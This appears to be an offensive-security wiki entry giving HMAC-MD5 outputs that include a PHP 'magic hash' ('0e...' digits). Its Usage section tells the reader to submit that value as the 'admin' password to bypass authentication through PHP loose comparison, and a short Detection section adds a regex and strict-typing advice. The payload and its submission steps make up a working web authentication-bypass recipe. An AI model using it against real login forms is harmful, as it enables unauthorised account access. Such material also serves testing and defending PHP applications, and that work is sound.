---
id: 0af0624d-c9a2-4be8-b2df-d14baf916413
name: HMAC-Magic-Hash-Examples
type: code
language: text
verified: true
created_at: '2023-04-06T03:56:40.735070+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
  - PHP
tags:
  - php
  - magic-hashes
  - hmac
validated: true
---

# HMAC-Magic-Hash-Examples

## Code

```
hash_hmac(admin|1424869663) -> "e716865d1953e310498068ee39922f49"
hash_hmac(admin|1424869664) -> "8c9a492d316efb5e358ceefe3829bde4"
hash_hmac(admin|1424869665) -> "9f7cdbe744fc2dae1202431c7c66334b"
hash_hmac(admin|1424869666) -> "105c0abe89825a14c471d4f0c1cc20ab"
...
hash_hmac(admin|1835970773) -> "0e174892301580325162390102935332" // "0e174892301580325162390102935332" == "0"
```

## Description

This code snippet provides example outputs from computing MD5 HMAC hashes using a key like 'admin' concatenated with timestamps. It illustrates the discovery of 'magic hashes'—those starting with '0e' followed by digits—that PHP's loose comparison treats as 0.0, enabling authentication bypass. These examples are generated offline to identify usable payloads for submission in login forms.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| admin | HMAC key (often the username) | admin |
| 1424869663 | Timestamp input data | 1835970773 (yields magic hash) |

## Usage

Use these examples as a reference when generating hashes with [[commands/generate-php-hmac-hash]]. Submit the magic hash (e.g., '0e174892301580325162390102935332') as the password in the target login form alongside the username 'admin'. This is typically done via a browser or proxied request in procedures like [[procedures/PHP-Magic-Hashes-Juggling-Auth-Bypass]].

## Detection

- Log all authentication attempts and flag inputs matching '0e[0-9]{26}' patterns.
- Enable PHP error logging to capture type conversion warnings.
- Monitor for successful logins with invalid or patterned passwords.
- Use strict typing in PHP (declare(strict_types=1)) to prevent juggling.

## Related

- [[procedures/PHP-Magic-Hashes-Juggling-Auth-Bypass]]
